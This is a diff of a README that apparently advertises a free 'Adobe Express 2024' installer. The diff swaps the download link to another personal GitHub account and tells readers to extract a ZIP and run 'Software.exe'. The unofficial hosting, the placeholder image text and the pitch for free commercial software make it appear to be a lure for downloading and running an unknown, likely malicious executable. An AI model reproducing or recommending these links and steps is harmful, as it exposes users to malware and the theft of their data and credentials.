@@ -7,12 +7,12 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/11186997-9ab6-45da-9506-11b40ce9fe45)
-](https://github.com/renataalvescun/Adobe-Express-2024/releases/download/V4.22/Release.zip)
+](https://github.com/zwbgongzuoshi/Adobe-Express-2024/releases/download/Release/Release.zip)
 
 
 
 ## **1. [Download the archive](https://github.com/renataalvescun/Adobe-Express-2024/releases/download/V4.22/Release.zip) and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
+## **2. Run the auto-installer `Software.exe`. It will install and download all necessary packages for > operation.**
 
 ![1Eb3bR5](https://github.com/user-attachments/assets/2ffcffe9-404e-4180-a5cf-a22f3be5e9d1)
 
